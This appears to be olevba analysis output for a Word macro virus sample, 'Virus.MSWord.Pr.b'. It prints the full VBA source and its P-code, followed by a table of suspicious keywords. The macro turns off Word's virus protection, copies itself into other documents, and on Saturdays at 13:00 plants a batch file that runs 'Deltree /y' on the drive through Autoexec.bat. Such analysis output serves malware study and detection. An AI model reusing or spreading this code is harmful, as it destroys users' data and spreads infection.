olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pr.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pr.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
















'







Dim A, B, D, E As Integer: Dim t, m, f, sf, w, s, sd
Private Sub Document_Close()
On Error GoTo rr
Options.VirusProtection = False: s = Application.ActiveDocument.Path: If s = "" Then End
A = 1: B = 2: pr1: A = 2: B = 1: pr1: t = Now: m = Year(t): w = WeekDay(t)
If m < 2002 Or w <> 7 Then End
If Hour(t) <> 13 Then End
pr2
rr:
End
End Sub
Private Sub pr1()
On Error GoTo rr1
D = Application.VBE.VBProjects(A).VBComponents(1).CodeModule.CountOfLines: E = Application.VBE.VBProjects(B).VBComponents(1).CodeModule.CountOfLines
If D > 10 Then Exit Sub
Application.VBE.VBProjects(A).VBComponents(1).CodeModule.AddFromString (Application.VBE.VBProjects(B).VBComponents(1).CodeModule.Lines(2, E))
Application.ActiveDocument.SaveAs
rr1:
End
End Sub
Private Sub pr2()
On Error GoTo rr2
fs = "c:\Autoexec.bat": f = "c:\My.bat": sd = Left(s, 2)
Open fs For Input As #1: Do While Not EOF(1): Line Input #1, rs: If rs = f Then Close #1: pr3: End
Loop: Close #1: SetAttr fs, vbNormal
rr2:
Open fs For Append As #1: Print #1, f: Close #1: pr3
End Sub
Private Sub pr3()
On Error GoTo rr3
SetAttr f, vbNormal: Kill f
rr3:
On Error GoTo rr4
Open f For Append As #1: Print #1, "@ Deltree /y "; sd; " >nul": Print #1, "@ del "; f; " >nul": Close
rr4:
End Sub
'microb97





































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pr.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4703 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0000 ""
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' 	Dim 
' 	VarDefn A
' 	VarDefn B
' 	VarDefn D
' 	VarDefn E (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn t
' 	VarDefn m
' 	VarDefn False
' 	VarDefn sf
' 	VarDefn w
' 	VarDefn s
' 	VarDefn sd
' Line #25:
' 	FuncDefn (Private Sub Document_Close())
' Line #26:
' 	OnError rr 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	St s 
' 	BoS 0x0000 
' 	Ld s 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #28:
' 	LitDI2 0x0001 
' 	St A 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St B 
' 	BoS 0x0000 
' 	ArgsCall pr1 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St A 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St B 
' 	BoS 0x0000 
' 	ArgsCall pr1 0x0000 
' 	BoS 0x0000 
' 	Ld Now 
' 	St t 
' 	BoS 0x0000 
' 	Ld t 
' 	ArgsLd Year 0x0001 
' 	St m 
' 	BoS 0x0000 
' 	Ld t 
' 	ArgsLd WeekDay 0x0001 
' 	St w 
' Line #29:
' 	Ld m 
' 	LitDI2 0x07D2 
' 	Lt 
' 	Ld w 
' 	LitDI2 0x0007 
' 	Ne 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #30:
' 	Ld t 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000D 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #31:
' 	ArgsCall pr2 0x0000 
' Line #32:
' 	Label rr 
' Line #33:
' 	End 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub pr1())
' Line #36:
' 	OnError rr1 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld A 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St D 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld B 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St E 
' Line #38:
' 	Ld D 
' 	LitDI2 0x000A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #39:
' 	LitDI2 0x0002 
' 	Ld E 
' 	LitDI2 0x0001 
' 	Ld B 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld A 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #41:
' 	Label rr1 
' Line #42:
' 	End 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Private Sub pr2())
' Line #45:
' 	OnError rr2 
' Line #46:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	St fs 
' 	BoS 0x0000 
' 	LitStr 0x0009 "c:\My.bat"
' 	St False 
' 	BoS 0x0000 
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	St sd 
' Line #47:
' 	Ld fs 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld rs 
' 	LineInput 
' 	BoS 0x0000 
' 	Ld rs 
' 	Ld False 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	ArgsCall pr3 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #48:
' 	Loop 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld fs 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #49:
' 	Label rr2 
' Line #50:
' 	Ld fs 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld False 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	ArgsCall pr3 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Private Sub pr3())
' Line #53:
' 	OnError rr3 
' Line #54:
' 	Ld False 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	Ld False 
' 	ArgsCall Kill 0x0001 
' Line #55:
' 	Label rr3 
' Line #56:
' 	OnError rr4 
' Line #57:
' 	Ld False 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "@ Deltree /y "
' 	PrintItemSemi 
' 	Ld sd 
' 	PrintItemSemi 
' 	LitStr 0x0005 " >nul"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "@ del "
' 	PrintItemSemi 
' 	Ld False 
' 	PrintItemSemi 
' 	LitStr 0x0005 " >nul"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	CloseAll 
' Line #58:
' 	Label rr4 
' Line #59:
' 	EndSub 
' Line #60:
' 	QuoteRem 0x0000 0x0008 "microb97"
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |My.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

